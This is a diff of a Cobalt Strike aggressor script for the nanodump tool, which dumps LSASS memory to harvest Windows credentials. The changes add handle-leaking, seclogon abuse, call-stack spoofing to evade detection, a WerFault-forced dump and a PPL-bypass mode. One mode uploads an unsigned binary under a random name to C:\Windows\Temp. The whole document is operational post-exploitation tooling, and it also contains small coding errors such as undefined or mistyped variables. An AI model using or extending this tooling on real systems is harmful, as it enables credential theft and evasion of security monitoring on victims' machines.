@@ -41,9 +41,39 @@ local('$string $c');
 beacon_command_register(
 "nanodump",
 "Use syscalls to dump LSASS.",
-"Usage: nanodump [--getpid] [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--fork] [--snapshot] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--malseclogon-race] [--werfault C:\\Windows\\Temp]");
+"usage: nanodump [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--werfault C:\\Windows\\Temp] [--fork] [--snapshot] [--getpid] [--help]\
+Dumpfile options:\
+    --write DUMP_PATH, -w DUMP_PATH\
+            filename of the dump\
+    --valid, -v\
+            create a dump with a valid signature\
+Obtain an LSASS handle via:\
+    --duplicate, -d\
+            duplicate an existing LSASS handle\
+    --seclogon-leak-local, -sll\
+            leak an LSASS handle into nanodump via seclogon\
+    --seclogon-leak-remote BIN_PATH, -slt BIN_PATH\
+            leak an LSASS handle into another process via seclogon and duplicate it\
+    --seclogon-duplicate, -sd\
+            make seclogon open a handle to LSASS and duplicate it\
+    --spoof-callstack {svchost,wmi,rpc}, -sc {svchost,wmi,rpc}\
+            open a handle to LSASS using a fake calling stack\
+Let WerFault.exe (instead of nanodump) create the dump\
+    --werfault DUMP_FOLDER, -wf DUMP_FOLDER\
+            force WerFault.exe to dump LSASS\
+Avoid reading LSASS directly:\
+    --fork, -f\
+            fork the target process before dumping\
+    --snapshot, -s\
+            snapshot the target process before dumping\
+Miscellaneous:\
+    --getpid\
+            print the PID of LSASS and leave\
+Help:\
+    --help, -h\
+            print this help message and leave");
 alias nanodump {
-    local('$barch $handle $bof $exe $args $pid $cname $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $get_pid $use_malseclogon $folder $nanodump_binary $werfault_lsass $use_werfault $use_malseclogon_race');
+    local('$barch $handle $bof $exe $args $pid $cname $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $get_pid $use_seclogon_leak_local $use_seclogon_leak_remote $folder $nanodump_binary $werfault_lsass $use_werfault $use_seclogon_duplicate $spoof_callstack');
 
     $barch = barch($1);
     if($barch eq "x86")
@@ -73,11 +103,12 @@ alias nanodump {
     $werfault_lsass = "";
     $use_werfault = 0;
     # by default, don't set any decoy binary
-    $binary_path = "";
-    # by default, do not use MalSecLogon
-    $use_malseclogon = 0;
+    $seclogon_leak_remote_binary = "";
+    # by default, do not use MalSecLogon leak
+    $use_seclogon_leak_local = 0;
+    $use_seclogon_leak_remote = 0;
     # by default, do not use the MalSecLogon race condition
-    $use_malseclogon_race = 0;
+    $use_seclogon_duplicate = 0;
     # by default, do not get the PID of LSASS
     $get_pid = 0;
     # by default, nanodump will find the PID of LSASS dinamically
@@ -96,12 +127,31 @@ alias nanodump {
     $dup = 0;
     # by default, the signature of the minidump is invalid
     $use_valid_sig = 0;
+    # by default, do not spoof the stack
+    $spoof_callstack = 0;
     for ($i = 1; $i < size(@_); $i++)
     {
-        if (@_[$i] eq "--malseclogon" || @_[$i] eq "-m")
+        if (@_[$i] eq "--getpid")
         {
-            # use MalSecLogon
-            $use_malseclogon = 1;
+            # get the PID of LSASS and leave
+            $get_pid = 1;
+        }
+        else if (@_[$i] eq "--valid" || @_[$i] eq "-v")
+        {
+            # use a valid signature for the minidump
+            $use_valid_sig = 1;
+        }
+        else if (@_[$i] eq "--write" || @_[$i] eq "-w")
+        {
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --write value");
+                return;
+            }
+            # set the path where the minidump will be written to disk
+            $write_file = 1;
+            $dump_path = @_[$i];
         }
         else if (@_[$i] eq "--pid" || @_[$i] eq "-p")
         {
@@ -119,18 +169,6 @@ alias nanodump {
                 return;
             }
         }
-        else if (@_[$i] eq "--write" || @_[$i] eq "-w")
-        {
-            $i++;
-            if($i >= size(@_))
-            {
-                berror($1, "missing --write value");
-                return;
-            }
-            # set the path where the minidump will be written to disk
-            $write_file = 1;
-            $dump_path = @_[$i];
-        }
         else if (@_[$i] eq "--fork" || @_[$i] eq "-f")
         {
             # set arg to true for process forking
@@ -141,41 +179,33 @@ alias nanodump {
             # set arg to true for process snapshot
             $snapshot = 1;
         }
-        else if (@_[$i] eq "--dup" || @_[$i] eq "-d")
+        else if (@_[$i] eq "--duplicate" || @_[$i] eq "-d")
         {
             # set arg to true for handle duplication
             $dup = 1;
         }
-        else if (@_[$i] eq "--valid" || @_[$i] eq "-v")
+        else if (@_[$i] eq "--seclogon-leak-local" || @_[$i] eq "-sll")
         {
-            # use a valid signature for the minidump
-            $use_valid_sig = 1;
+            # use MalSecLogon leak local
+            $use_seclogon_leak_local = 1;
         }
-        else if (@_[$i] eq "--getpid")
+        else if (@_[$i] eq "--seclogon-leak-remote" || @_[$i] eq "-slr")
         {
-            # get the PID of LSASS and leave
-            $get_pid = 1;
-        }
-        else if (@_[$i] eq "--binary" || @_[$i] eq "-b")
-        {
+            # use MalSecLogon leak remote
+            $use_seclogon_leak_remote = 1;
             $i++;
             if($i >= size(@_))
             {
-                berror($1, "missing --binary value");
+                berror($1, "missing --seclogon-leak-remote value");
                 return;
             }
             # decoy binary path
-            $binary_path = @_[$i];
-            if(!is_full_path($binary_path))
+            $seclogon_leak_remote_binary = @_[$i];
+            if(!is_full_path($seclogon_leak_remote_binary))
             {
-                berror($1, "You must provide a full path: " . $binary_path);
+                berror($1, "You must provide a full path: " . $seclogon_leak_remote_binary);
                 return;
             }
-        }
-        else if (@_[$i] eq "--malseclogon-race" || @_[$i] eq "-mr")
-        {
-            # use the seclogon race condition to dup an LSASS handle
-            $use_malseclogon_race = 1;
         }
         else if (@_[$i] eq "--werfault" || @_[$i] eq "-wf")
         {
@@ -187,6 +217,42 @@ alias nanodump {
             }
             $use_werfault = 1;
             $werfault_lsass = @_[$i];
+        }
+        else if (@_[$i] eq "--seclogon-duplicate" || @_[$i] eq "-sd")
+        {
+            # use the seclogon race condition to dup an LSASS handle
+            $use_seclogon_duplicate = 1;
+        }
+        else if (@_[$i] eq "--spoof-callstack" || @_[$i] eq "-sc")
+        {
+            if ($barch eq "x86")
+            {
+                berror($1, "The --spoof-callstack feature is only x64");
+                return;
+            }
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --spoof-callstack value");
+                return;
+            }
+            if (@_[$i] eq "svchost")
+            {
+                $spoof_callstack = 1;
+            }
+            else if (@_[$i] eq "wmi")
+            {
+                $spoof_callstack = 2;
+            }
+            else if (@_[$i] eq "rpc")
+            {
+                $spoof_callstack = 3;
+            }
+            else
+            {
+                berror($1, "invalid --spoof-callstack value");
+                return;
+            }
         }
         else if (@_[$i] eq "--help" || @_[$i] eq "-h")
         {
@@ -200,59 +266,128 @@ alias nanodump {
         }
     }
 
-    if ($use_werfault &&
-        ($fork || $snapshot || $dup || $use_malseclogon_race ||
-         $use_malseclogon || $use_valid_sig || $get_pid ||
-         strlen($binary_path) != 0 || $write_file))
-     {
-        berror($1, "The option --werfault cannot be combined with any other");
+    if ($get_pid &&
+        ($write_file || &use_valid_sig || $snapshot || $fork ||
+         $use_seclogon_duplicate || $spoof_callstack || $use_seclogon_leak_local ||
+         $use_seclogon_leak_remote || $dup || $use_werfault))
+    {
+        berror($1, "The parameter --getpid is used alone");
         return;
-     }
+    }
 
+    if ($use_werfault &&
+        ($write_file || &use_valid_sig || $snapshot || $fork ||
+         $use_seclogon_duplicate || $spoof_callstack || $use_seclogon_leak_local ||
+         $use_seclogon_leak_remote || $dup))
+    {
+        berror($1, "The parameter --werfault is used alone");
+        return;
+    }
     if($fork && $snapshot)
     {
-        berror($1, "The options --fork and --snapshot cannot be used at the same time");
+        berror($1, "The options --fork and --snapshot cannot be used together");
         return;
     }
 
-    if($use_malseclogon && $dup && strlen($binary_path) == 0)
+    if($fork && $use_seclogon_duplicate)
     {
-        berror($1, "If --malseclogon and --dup are used, provide a decoy binary with --binary C:\\Windows\\notepad.exe");
+        berror($1, "The options --fork and --seclogon-duplicate cannot be used together");
         return;
     }
 
-    if(strlen($binary_path) > 0 && ($use_malseclogon == 0 || $dup == 0))
+    if($dup && $spoof_callstack)
     {
-        berror($1, "The --binary option can only be used when --malseclogon and --dup are used");
+        berror($1, "The options --duplicate and --spoof-callstack cannot be used together");
         return;
     }
 
-    if($use_malseclogon && !$dup && !is_full_path($dump_path))
+    if($dup && $use_seclogon_duplicate)
     {
-        berror($1, "If MalSecLogon is being used locally, you need to provide the full path: ". $dump_path);
+        berror($1, "The options --duplicate and --seclogon-duplicate cannot be used together");
         return;
     }
 
-    if($use_malseclogon && $dup == 0 && $write_file == 0)
+    if($dup && $use_seclogon_leak_local)
     {
-        berror($1, "The option --malseclogon requires a dump path with --write unless --dup is also provided");
+        berror($1, "The options --duplicate and --seclogon-leak-local cannot be used together");
         return;
     }
 
-    if ($use_malseclogon_race &&
-        ($fork || $snapshot || $dup || $use_werfault ||
-         $use_malseclogon || $get_pid ||
-         strlen($binary_path) != 0))
-     {
-        berror($1, "The option --malseclogon-race can only be used with --write and --valid");
+    if($dup && $use_seclogon_leak_remote)
+    {
+        berror($1, "The options --duplicate and --seclogon-leak-remote cannot be used together");
         return;
-     }
+    }
 
-    if($use_malseclogon && $dup == 0)
+    if($use_seclogon_leak_local && $use_seclogon_leak_remote)
+    {
+        berror($1, "The options --seclogon-leak-local and --seclogon-leak-remote cannot be used together");
+        return;
+    }
+
+    if($use_seclogon_leak_local && $use_seclogon_duplicate)
+    {
+        berror($1, "The options --seclogon-leak-local and --seclogon-duplicate cannot be used together");
+        return;
+    }
+
+    if($use_seclogon_leak_local && $spoof_callstack)
+    {
+        berror($1, "The options --seclogon-leak-local and --spoof-callstack cannot be used together");
+        return;
+    }
+
+    if($use_seclogon_leak_remote && $use_seclogon_duplicate)
+    {
+        berror($1, "The options --seclogon-leak-remote and --seclogon-duplicate cannot be used together");
+        return;
+    }
+
+    if($use_seclogon_leak_remote && $spoof_callstack)
+    {
+        berror($1, "The options --seclogon-leak-remote and --spoof-callstack cannot be used together");
+        return;
+    }
+
+    if($use_seclogon_duplicate && $snapshot)
+    {
+        berror($1, "The options --seclogon-duplicate and --snapshot cannot be used together");
+        return;
+    }
+
+    if($use_seclogon_duplicate && $spoof_callstack)
+    {
+        berror($1, "The options --seclogon-duplicate and --spoof-callstack cannot be used together");
+        return;
+    }
+
+    ########################################################
+
+
+
+    if($use_seclogon_leak && $use_seclogon_duplicate)
+    {
+        berror($1, "The options --malseclogon-leak and --seclogon-duplicate cannot be used together");
+        return;
+    }
+
+    if($use_seclogon_leak_local && !$write_file)
+    {
+        berror($1, "If --seclogon-leak-local is being used, you need to provide the dump path with --write");
+        return;
+    }
+
+    if($use_seclogon_leak_local && !is_full_path($dump_path))
+    {
+        berror($1, "If --seclogon-leak-local is being used, you need to provide the full path: ". $dump_path);
+        return;
+    }
+
+    if($use_seclogon_leak_local)
     {
         $folder = "C:\\Windows\\Temp";
-        $binary_path = $folder . "\\" .  generate_rand_string(5, 10) . ".exe";
-        blog($1, "[!] An unsigned nanodump binary will be uploaded to: ". $binary_path .". Use --malseclogon with --dup to avoid this.");
+        $seclogon_leak_remote_binary = $folder . "\\" .  generate_rand_string(5, 10) . ".exe";
+        blog($1, "[!] An unsigned nanodump binary will be uploaded to: ". $seclogon_leak_remote_binary);
         # read in the EXE file
         $handle = openf(script_resource("dist/nanodump." . $barch . ".exe"));
         $exe = readb($handle, -1);
@@ -263,11 +398,11 @@ alias nanodump {
             return;
         }
         # upload the nanodump binary
-        bupload_raw($1, $binary_path, $exe);
+        bupload_raw($1, $seclogon_leak_remote_binary, $exe);
     }
 
     # pack the arguments
-    $args = bof_pack($1, "iziiiiiiiziiz", $pid, $dump_path, $write_file, $use_valid_sig, $fork, $snapshot, $dup, $get_pid, $use_malseclogon, $binary_path, $use_malseclogon_race, $use_werfault, $werfault_lsass);
+    $args = bof_pack($1, "iziiiiiiiiziiiz", $pid, $dump_path, $write_file, $use_valid_sig, $fork, $snapshot, $dup, $get_pid, $use_seclogon_leak_local, $use_seclogon_leak_remote, $seclogon_leak_remote_binary, $use_seclogon_duplicate, $spoof_callstack, $use_werfault, $werfault_lsass);
 
     # run
     btask($1, "Running NanoDump BOF");
@@ -277,9 +412,20 @@ alias nanodump {
 beacon_command_register(
 "nanodump_ppl",
 "Bypass PPL and dump LSASS.",
-"Usage: nanodump_ppl --write C:\\Windows\\Temp\\doc.docx [--valid] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe]");
+"usage: nanodump_ppl --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]\
+Dumpfile options:\
+    --write DUMP_PATH, -w DUMP_PATH\
+            filename of the dump\
+    --valid, -v\
+            create a dump with a valid signature\
+Obtain an LSASS handle via:\
+    --duplicate, -d\
+            duplicate an existing LSASS handle\
+Help:\
+    --help, -h\
+            print this help message and leave");
 alias nanodump_ppl {
-    local('$barch $handle $bof $exe $args $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $use_malseclogon $binary_path $dll');
+    local('$barch $handle $bof $exe $args $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $dll');
 
     $barch = barch($1);
     if($barch eq "x86")
@@ -318,18 +464,10 @@ alias nanodump_ppl {
     $dump_path = "";
     # by default, download the minidump fileless
     $write_file = 0;
-    # by default, do not fork the target process
-    $fork = 0;
-    # by default, do not snapshot the target process
-    $snapshot = 0;
     # by default, do not duplicate an LSASS handle
     $dup = 0;
     # by default, the signature of the minidump is invalid
     $use_valid_sig = 0;
-    # by default, don't set any decoy binary
-    $binary_path = "";
-    # by default, do not use MalSecLogon
-    $use_malseclogon = 0;
     for ($i = 1; $i < size(@_); $i++)
     {
         if (@_[$i] eq "--write" || @_[$i] eq "-w")
@@ -344,21 +482,7 @@ alias nanodump_ppl {
             $write_file = 1;
             $dump_path = @_[$i];
         }
-        else if (@_[$i] eq "--fork" || @_[$i] eq "-f")
-        {
-            berror($1, "The parameter --fork is not allowed.");
-            return;
-            # set arg to true for process forking
-            #$fork = 1;
-        }
-        else if (@_[$i] eq "--snapshot" || @_[$i] eq "-s")
-        {
-            berror($1, "The parameter --snapshot is not allowed.");
-            return;
-            # set arg to true for process snapshot
-            #$snapshot = 1;
-        }
-        else if (@_[$i] eq "--dup" || @_[$i] eq "-d")
+        else if (@_[$i] eq "--duplicate" || @_[$i] eq "-d")
         {
             # set arg to true for handle duplication
             $dup = 1;
@@ -368,30 +492,9 @@ alias nanodump_ppl {
             # use a valid signature for the minidump
             $use_valid_sig = 1;
         }
-        else if (@_[$i] eq "--malseclogon" || @_[$i] eq "-m")
-        {
-            # use MalSecLogon
-            $use_malseclogon = 1;
-        }
-        else if (@_[$i] eq "--binary" || @_[$i] eq "-b")
-        {
-            $i++;
-            if($i >= size(@_))
-            {
-                berror($1, "missing --binary value");
-                return;
-            }
-            # decoy binary path
-            $binary_path = @_[$i];
-            if(!is_full_path($binary_path))
-            {
-                berror($1, "You must provide a full path: " . $binary_path);
-                return;
-            }
-        }
         else if (@_[$i] eq "--help" || @_[$i] eq "-h")
         {
-            berror($1, beacon_command_detail("nanodump"));
+            berror($1, beacon_command_detail("nanodump_ppl"));
             return;
         }
         else
@@ -403,7 +506,7 @@ alias nanodump_ppl {
 
     if ($write_file == 0)
     {
-        berror($1, "The --write parameter is must be specified");
+        berror($1, "The --write parameter must be specified");
         return;
     }
 
@@ -413,32 +516,8 @@ alias nanodump_ppl {
         return;
     }
 
-    if($fork && $snapshot)
-    {
-        berror($1, "The options --fork and --snapshot cannot be used at the same time");
-        return;
-    }
-
-    if($use_malseclogon && !$dup)
-    {
-        berror($1, "In this mode, if MalSecLogon is being used, --dup must be provided.");
-        return;
-    }
-
-    if($use_malseclogon && strlen($binary_path) == 0)
-    {
-        berror($1, "If --malseclogon is used, provide a decoy binary with --binary C:\\Windows\\notepad.exe");
-        return;
-    }
-
-    if(strlen($binary_path) > 0 && !$use_malseclogon)
-    {
-        berror($1, "The --binary option can only be used when --malseclogon and --dup are used");
-        return;
-    }
-
     # pack the arguments
-    $args = bof_pack($1, "ziiiiizb", $dump_path, $use_valid_sig, $fork, $snapshot, $dup, $use_malseclogon, $binary_path, $dll);
+    $args = bof_pack($1, "ziib", $dump_path, $use_valid_sig, $dup, $dll);
 
     # run
     btask($1, "Running NanoDumpPPL BOF");
